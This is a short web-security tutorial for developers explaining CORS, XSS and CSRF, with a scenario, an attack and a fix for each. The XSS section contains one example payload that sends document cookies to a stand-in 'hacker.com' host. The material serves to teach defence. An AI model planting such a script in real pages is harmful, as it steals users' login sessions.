# 38.3 Web Security Mechanics (CORS, CSRF, XSS)

Because the web is an open protocol, it is a hive of scum and villainy. Browsers have implemented immensely strict rules to prevent malicious websites from stealing your data.

As a Fullstack Developer, you will spend 30% of your time fighting these browser security mechanisms.

## 1. CORS (Cross-Origin Resource Sharing)
**The Scenario:** You build an API at `api.mystartup.com`. You build a React frontend running on your laptop at `localhost:3000`. Your React app tries to `fetch()` data from your API.

**The Error:** `Access to fetch at 'api.mystartup.com' from origin 'localhost:3000' has been blocked by CORS policy.`

**Why?** The browser implements the **Same-Origin Policy**. Scripts running on `Website A` are physically forbidden from asking `Website B` for data. If they could, a malicious site you visit could secretly run Javascript in the background to query `bankofamerica.com/balances` and read your bank account.

**The Fix:** `Website B` (Your API) must explicitly tell the browser: "I allow `localhost:3000` to read my data." The server does this by attaching a special HTTP Header to its response:
`Access-Control-Allow-Origin: *` (Allow anyone) or 
`Access-Control-Allow-Origin: http://localhost:3000` (Strictly allow my frontend).

## 2. XSS (Cross-Site Scripting)
**The Scenario:** You build a Comment Section. A hacker submits a comment containing the text: 
`<script>fetch("hacker.com?steal=" + document.cookie)</script>`.
Your database saves this string blindly.

**The Attack:** When innocent users visit the page, your server sends that string in the HTML. Their Chrome browser interprets the `<script>` tag as legitimate code, executes it, and sends their secret login cookies to the hacker.

**The Fix:** **Never trust user input.** Always "Sanitize" or "Escape" HTMl characters before rendering them. Modern frameworks like React do this automatically (`{comment}` will render the text literally, avoiding script execution).

## 3. CSRF (Cross-Site Request Forgery)
**The Scenario:** You are logged into `twitter.com`. Twitter stores a persistent "session cookie" in your browser. Every time you send a request to Twitter, Chrome automatically attaches the cookie to prove it's you.

**The Attack:** You visit `bad-guy.com`. `bad-guy.com` contains a hidden form with `action="https://twitter.com/delete_account"`. When the page loads, `bad-guy.com`'s Javascript secretly clicks the "Submit" button.

Because the request goes to `twitter.com`, your Chrome browser *automatically attaches your Twitter login cookie*. Twitter receives the request, sees your valid cookie, and deletes your account. You didn't even know it happened.

**The Fix:** The modern defense is setting all authorization Cookies to `SameSite=Strict` or `Lax`. This tells Chrome: "Do NOT attach this cookie to requests heading to Twitter, UNLESS the user is physically looking at a `twitter.com` URL in the address bar."
Historically, servers also used unpredictable CSRF Tokens hidden in legitimate forms that the hacker couldn't guess.
